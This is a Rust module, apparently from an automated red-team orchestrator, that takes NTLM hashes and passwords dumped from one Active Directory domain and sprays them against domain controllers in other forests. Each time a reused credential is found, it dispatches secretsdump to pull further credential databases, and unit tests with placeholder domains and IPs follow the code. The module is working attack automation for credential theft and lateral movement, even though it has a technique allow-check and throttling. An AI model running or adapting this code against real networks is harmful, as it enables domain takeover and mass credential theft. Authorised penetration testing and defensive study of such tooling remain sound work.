//! auto_credential_reuse -- cross-domain hash reuse after NTDS dumps.
//!
//! After any secretsdump extracts NTLM hashes, tries those hashes against DCs
//! in OTHER domains. Catches the common pattern where service accounts or
//! built-in accounts (e.g. `localuser`) share passwords across domains/forests.
//!
//! This is distinct from `auto_local_admin_secretsdump` which only targets
//! same-domain and parent-domain DCs.

use std::sync::Arc;
use std::time::Duration;

use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::StateInner;

/// Dedup key namespace for cross-domain reuse attempts.
const DEDUP_CROSS_REUSE: &str = "cross_reuse";

/// Check if a username is a high-value reuse candidate.
///
/// Machine accounts (`HOST$`) are NEVER reuse candidates — their NT hash is
/// derived from the computer's randomly-generated 240-byte password and is
/// bound to that computer object in its source NTDS. The hash will not
/// authenticate as another machine, in another domain, or in any trusted
/// forest. Dispatching `secretsdump` with a foreign machine hash always
/// returns STATUS_LOGON_FAILURE and just burns dispatcher budget.
fn is_reuse_candidate(username: &str) -> bool {
    if username.ends_with('$') {
        return false;
    }
    let u = username.to_lowercase();
    u == "administrator"
        || u == "localuser"
        || u.contains("svc")
        || u.contains("admin")
        || u.contains("sql")
}

/// Check if two domains should be skipped for cross-domain reuse (same or parent/child).
fn is_same_forest_domain(domain_a: &str, domain_b: &str) -> bool {
    let a = domain_a.to_lowercase();
    let b = domain_b.to_lowercase();
    a == b || a.ends_with(&format!(".{b}")) || b.ends_with(&format!(".{a}"))
}

/// Build cross-domain reuse dedup key.
fn cross_reuse_dedup_key(
    dc_ip: &str,
    target_domain: &str,
    username: &str,
    hash_prefix: &str,
) -> String {
    format!(
        "{}:{}:{}:{}",
        dc_ip,
        target_domain,
        username.to_lowercase(),
        hash_prefix
    )
}

/// Cross-domain credential reuse automation.
/// Interval: 30s. Tries hashes from dominated domains against other forests' DCs.
/// `(dedup_key, dc_ip, username, source_domain, hash_value)` — one
/// cross-forest hash-reuse work item.
pub(crate) type CrossReuseHashWork = (String, String, String, String, String);

/// `(dedup_key, dc_ip, username, target_domain, password)` — one
/// cross-forest password-reuse work item.
pub(crate) type CrossReuseCredWork = (String, String, String, String, String);

/// Sanitize a password to its 16-char prefix-as-dedup-key form. Non-alphanumeric
/// characters are replaced with `_` so the resulting string is safe to embed
/// in a Redis key.
pub(crate) fn cred_password_prefix(password: &str) -> String {
    password
        .chars()
        .take(16)
        .collect::<String>()
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
        .collect()
}

/// Select cross-forest NTLM-hash reuse work items.
///
/// For each NTLM hash from a `reuse_candidate` principal, pairs it with
/// every DC in a DIFFERENT forest than the hash's source domain. Skips
/// already-processed dedup keys.
pub(crate) fn select_hash_reuse_work(state: &StateInner) -> Vec<CrossReuseHashWork> {
    let mut items = Vec::new();
    let reuse_hashes: Vec<_> = state
        .hashes
        .iter()
        .filter(|h| h.hash_type.to_uppercase() == "NTLM")
        .filter(|h| !h.hash_value.is_empty())
        .filter(|h| is_reuse_candidate(&h.username))
        .collect();
    for hash in &reuse_hashes {
        let hash_domain = hash.domain.to_lowercase();
        for (dc_domain, dc_ip) in &state.all_domains_with_dcs() {
            let target_domain = dc_domain.to_lowercase();
            if is_same_forest_domain(&target_domain, &hash_domain) {
                continue;
            }
            let hash_prefix = &hash.hash_value[..16.min(hash.hash_value.len())];
            let dedup = cross_reuse_dedup_key(dc_ip, &target_domain, &hash.username, hash_prefix);
            if !state.is_processed(DEDUP_CROSS_REUSE, &dedup) {
                items.push((
                    dedup,
                    dc_ip.clone(),
                    hash.username.clone(),
                    hash.domain.clone(),
                    hash.hash_value.clone(),
                ));
            }
        }
    }
    items
}

/// Select cross-forest cleartext-password reuse work items.
///
/// For each non-empty credential from a `reuse_candidate` principal, pairs
/// it with every DC in a DIFFERENT forest than the credential's source
/// domain. The `target_domain` is rebound to the target forest so the auth
/// string used downstream is the actual reuse test.
pub(crate) fn select_cred_reuse_work(state: &StateInner) -> Vec<CrossReuseCredWork> {
    let mut items = Vec::new();
    let reuse_creds: Vec<_> = state
        .credentials
        .iter()
        .filter(|c| !c.password.is_empty())
        .filter(|c| is_reuse_candidate(&c.username))
        .collect();
    for cred in &reuse_creds {
        let cred_domain = cred.domain.to_lowercase();
        for (dc_domain, dc_ip) in &state.all_domains_with_dcs() {
            let target_domain = dc_domain.to_lowercase();
            if is_same_forest_domain(&target_domain, &cred_domain) {
                continue;
            }
            let pw_prefix_full = cred_password_prefix(&cred.password);
            let dedup = cross_reuse_dedup_key(
                dc_ip,
                &target_domain,
                &cred.username,
                &format!("pw:{pw_prefix_full}"),
            );
            if !state.is_processed(DEDUP_CROSS_REUSE, &dedup) {
                items.push((
                    dedup,
                    dc_ip.clone(),
                    cred.username.clone(),
                    target_domain,
                    cred.password.clone(),
                ));
            }
        }
    }
    items
}

pub async fn auto_credential_reuse(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    // Wait for initial recon to populate state
    tokio::time::sleep(Duration::from_secs(60)).await;

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Only fire if the technique is allowed
        if !dispatcher.is_technique_allowed("credential_reuse") {
            continue;
        }

        let (hash_work, cred_work) = {
            let state = dispatcher.state.read().await;
            if state.all_domains_with_dcs().len() < 2 {
                continue;
            }
            (
                select_hash_reuse_work(&state),
                select_cred_reuse_work(&state),
            )
        };

        if hash_work.is_empty() && cred_work.is_empty() {
            continue;
        }

        for (dedup_key, dc_ip, username, source_domain, hash_value) in hash_work.into_iter().take(3)
        {
            debug!(
                dc = %dc_ip,
                username = %username,
                source_domain = %source_domain,
                "Attempting cross-domain hash reuse"
            );

            let priority = dispatcher.effective_priority("credential_reuse");
            match dispatcher
                .request_secretsdump_hash(
                    &dc_ip,
                    &username,
                    &source_domain,
                    &hash_value,
                    priority,
                    None,
                )
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        dc = %dc_ip,
                        username = %username,
                        source_domain = %source_domain,
                        "Cross-domain hash reuse secretsdump dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_CROSS_REUSE, dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_CROSS_REUSE, &dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!("Cross-domain reuse deferred by throttler");
                }
                Err(e) => warn!(err = %e, "Failed to dispatch cross-domain reuse"),
            }
        }

        for (dedup_key, dc_ip, username, target_domain, password) in cred_work.into_iter().take(3) {
            debug!(
                dc = %dc_ip,
                username = %username,
                target_domain = %target_domain,
                "Attempting cross-domain password reuse"
            );

            let probe_cred = ares_core::models::Credential {
                id: format!("reuse-probe-{}@{}", username, target_domain),
                username: username.clone(),
                password: password.clone(),
                domain: target_domain.clone(),
                source: "credential_reuse_probe".to_string(),
                discovered_at: None,
                is_admin: false,
                parent_id: None,
                attack_step: 0,
            };

            let priority = dispatcher.effective_priority("credential_reuse");
            match dispatcher
                .request_secretsdump(&dc_ip, &probe_cred, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        dc = %dc_ip,
                        username = %username,
                        target_domain = %target_domain,
                        "Cross-domain password reuse secretsdump dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_CROSS_REUSE, dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_CROSS_REUSE, &dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!("Cross-domain password reuse deferred by throttler");
                }
                Err(e) => warn!(err = %e, "Failed to dispatch cross-domain password reuse"),
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn reuse_candidate_administrator() {
        assert!(is_reuse_candidate("administrator"));
        assert!(is_reuse_candidate("Administrator"));
        assert!(is_reuse_candidate("ADMINISTRATOR"));
    }

    #[test]
    fn reuse_candidate_localuser() {
        assert!(is_reuse_candidate("localuser"));
        assert!(is_reuse_candidate("LocalUser"));
    }

    #[test]
    fn reuse_candidate_service_accounts() {
        assert!(is_reuse_candidate("svc_backup"));
        assert!(is_reuse_candidate("SVC_SQL"));
        assert!(is_reuse_candidate("my_svc_account"));
    }

    #[test]
    fn reuse_candidate_admin_substring() {
        assert!(is_reuse_candidate("domainadmin"));
        assert!(is_reuse_candidate("AdminUser"));
    }

    #[test]
    fn reuse_candidate_sql_substring() {
        assert!(is_reuse_candidate("sqlservice"));
        assert!(is_reuse_candidate("SQL_Agent"));
    }

    #[test]
    fn reuse_candidate_machine_accounts_rejected() {
        assert!(!is_reuse_candidate("DC01$"));
        assert!(!is_reuse_candidate("WS01$"));
        assert!(!is_reuse_candidate("SQL01$"));
    }

    #[test]
    fn reuse_candidate_regular_user_rejected() {
        assert!(!is_reuse_candidate("jsmith"));
        assert!(!is_reuse_candidate("John.Doe"));
        assert!(!is_reuse_candidate("regularUser"));
        assert!(!is_reuse_candidate("WORKSTATION01"));
    }

    #[test]
    fn reuse_candidate_empty_string() {
        assert!(!is_reuse_candidate(""));
    }

    #[test]
    fn same_forest_domain_exact() {
        assert!(is_same_forest_domain("contoso.local", "contoso.local"));
    }

    #[test]
    fn same_forest_domain_case_insensitive() {
        assert!(is_same_forest_domain("CONTOSO.LOCAL", "contoso.local"));
    }

    #[test]
    fn same_forest_domain_child_of() {
        assert!(is_same_forest_domain(
            "child.contoso.local",
            "contoso.local"
        ));
    }

    #[test]
    fn same_forest_domain_parent_of() {
        assert!(is_same_forest_domain(
            "contoso.local",
            "child.contoso.local"
        ));
    }

    #[test]
    fn same_forest_domain_unrelated() {
        assert!(!is_same_forest_domain("fabrikam.local", "contoso.local"));
    }

    #[test]
    fn same_forest_domain_empty() {
        assert!(is_same_forest_domain("", ""));
    }

    #[test]
    fn same_forest_domain_one_empty() {
        assert!(!is_same_forest_domain("contoso.local", ""));
    }

    #[test]
    fn cross_reuse_dedup_key_basic() {
        assert_eq!(
            cross_reuse_dedup_key(
                "192.168.58.1",
                "fabrikam.local",
                "Administrator",
                "aabbccdd11223344"
            ),
            "192.168.58.1:fabrikam.local:administrator:aabbccdd11223344"
        );
    }

    #[test]
    fn cross_reuse_dedup_key_lowercases_username() {
        let key = cross_reuse_dedup_key("192.168.58.1", "fabrikam.local", "ADMIN", "abcd");
        assert!(key.contains(":admin:"));
    }

    #[test]
    fn cross_reuse_dedup_key_empty_fields() {
        assert_eq!(cross_reuse_dedup_key("", "", "", ""), ":::");
    }

    // ── cred_password_prefix ────────────────────────────────────────────

    #[test]
    fn cred_password_prefix_takes_first_16_chars() {
        assert_eq!(
            cred_password_prefix("abcdefghijklmnopqrstuvwxyz"),
            "abcdefghijklmnop"
        );
    }

    #[test]
    fn cred_password_prefix_sanitises_non_alphanumeric() {
        assert_eq!(cred_password_prefix("P@ssw0rd!#$%"), "P_ssw0rd____");
    }

    #[test]
    fn cred_password_prefix_short_password_passes_through() {
        assert_eq!(cred_password_prefix("Pw1"), "Pw1");
    }

    #[test]
    fn cred_password_prefix_empty_returns_empty() {
        assert_eq!(cred_password_prefix(""), "");
    }

    // ── select_hash_reuse_work ──────────────────────────────────────────

    fn make_cred(user: &str, password: &str, domain: &str) -> ares_core::models::Credential {
        ares_core::models::Credential {
            id: format!("c-{user}-{domain}"),
            username: user.to_string(),
            password: password.to_string(),
            domain: domain.to_string(),
            source: String::new(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_hash(user: &str, value: &str, domain: &str) -> ares_core::models::Hash {
        ares_core::models::Hash {
            id: format!("h-{user}-{domain}"),
            username: user.to_string(),
            hash_value: value.to_string(),
            hash_type: "NTLM".to_string(),
            domain: domain.to_string(),
            cracked_password: None,
            source: String::new(),
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
            aes_key: None,
            is_previous: false,
            source_host: None,
            is_trust_key: false,
            trust_pair_label: None,
        }
    }

    #[test]
    fn hash_reuse_empty_state() {
        let s = StateInner::new("op".into());
        assert!(select_hash_reuse_work(&s).is_empty());
    }

    #[test]
    fn hash_reuse_emits_when_cross_forest_dc_present() {
        let mut s = StateInner::new("op".into());
        // is_reuse_candidate requires admin/svc/sql/administrator/localuser
        // — pick "Administrator" so the candidate filter passes.
        s.hashes.push(make_hash(
            "Administrator",
            "aad3b435b51404eeaad3b435b51404ee",
            "contoso.local",
        ));
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        let work = select_hash_reuse_work(&s);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].1, "192.168.58.40");
        assert_eq!(work[0].2, "Administrator");
        assert_eq!(work[0].3, "contoso.local");
    }

    #[test]
    fn hash_reuse_skips_same_forest_dc() {
        let mut s = StateInner::new("op".into());
        s.hashes.push(make_hash(
            "alice",
            "aad3b435b51404eeaad3b435b51404ee",
            "contoso.local",
        ));
        // Same-forest DC → no reuse work (same forest already has the cred).
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        assert!(select_hash_reuse_work(&s).is_empty());
    }

    #[test]
    fn hash_reuse_skips_non_ntlm_hashes() {
        let mut s = StateInner::new("op".into());
        let mut h = make_hash("Administrator", "deadbeef", "contoso.local");
        h.hash_type = "AES256".into();
        s.hashes.push(h);
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        assert!(select_hash_reuse_work(&s).is_empty());
    }

    #[test]
    fn hash_reuse_skips_already_processed() {
        let mut s = StateInner::new("op".into());
        s.hashes.push(make_hash(
            "Administrator",
            "aad3b435b51404eeaad3b435b51404ee",
            "contoso.local",
        ));
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        let key = cross_reuse_dedup_key(
            "192.168.58.40",
            "fabrikam.local",
            "Administrator",
            &"aad3b435b51404eeaad3b435b51404ee"[..16],
        );
        s.mark_processed(DEDUP_CROSS_REUSE, key);
        assert!(select_hash_reuse_work(&s).is_empty());
    }

    #[test]
    fn hash_reuse_skips_non_candidate_username() {
        let mut s = StateInner::new("op".into());
        // "alice" doesn't match the candidate regex (admin/svc/sql/etc).
        s.hashes
            .push(make_hash("alice", "deadbeef", "contoso.local"));
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        assert!(select_hash_reuse_work(&s).is_empty());
    }

    #[test]
    fn hash_reuse_skips_machine_account_username() {
        let mut s = StateInner::new("op".into());
        // Trailing-$ machine accounts are not reuse candidates.
        s.hashes
            .push(make_hash("SQL01$", "deadbeef", "contoso.local"));
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        assert!(select_hash_reuse_work(&s).is_empty());
    }

    // ── select_cred_reuse_work ──────────────────────────────────────────

    #[test]
    fn cred_reuse_empty_state() {
        let s = StateInner::new("op".into());
        assert!(select_cred_reuse_work(&s).is_empty());
    }

    #[test]
    fn cred_reuse_emits_when_cross_forest_dc_present() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("svc_sql", "Pw", "contoso.local"));
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        let work = select_cred_reuse_work(&s);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].2, "svc_sql");
        assert_eq!(work[0].3, "fabrikam.local");
        assert_eq!(work[0].4, "Pw");
    }

    #[test]
    fn cred_reuse_skips_empty_password() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("svc_sql", "", "contoso.local"));
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        assert!(select_cred_reuse_work(&s).is_empty());
    }

    #[test]
    fn cred_reuse_skips_same_forest_dc() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("svc_sql", "Pw", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        assert!(select_cred_reuse_work(&s).is_empty());
    }
}
